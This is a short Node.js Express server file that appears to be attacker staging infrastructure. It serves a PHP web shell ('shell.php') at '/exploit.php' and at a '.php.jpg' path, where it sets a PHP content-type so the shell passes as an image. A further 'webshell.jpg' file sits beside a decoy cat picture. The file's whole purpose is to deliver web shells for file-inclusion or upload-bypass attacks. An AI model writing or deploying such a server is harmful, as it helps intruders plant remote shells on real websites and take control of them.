const express = require('express');
const app = express();

const PORT = 3000;

app.get('/exploit.php', (req,res) => {
  console.log(req.path);
  res.sendFile(__dirname + '/public/shell.php');
})

app.get('/gay/.php.jpg', (req,res) => {
  console.log(req.path);
  res.setHeader('content-type', 'application/x-httpd-php');
  res.sendFile(__dirname + '/public/shell.php');
})

app.get('/meow.jpg', (req,res) => {
  res.sendFile(__dirname + '/public/gatto.jpg');
})

app.get('/webshell.jpg', (req,res) => {
  res.sendFile(__dirname + '/public/webshell.jpg');
})

const server = app.listen(PORT, () => {
  console.log("server is running on port ", 3000);
});
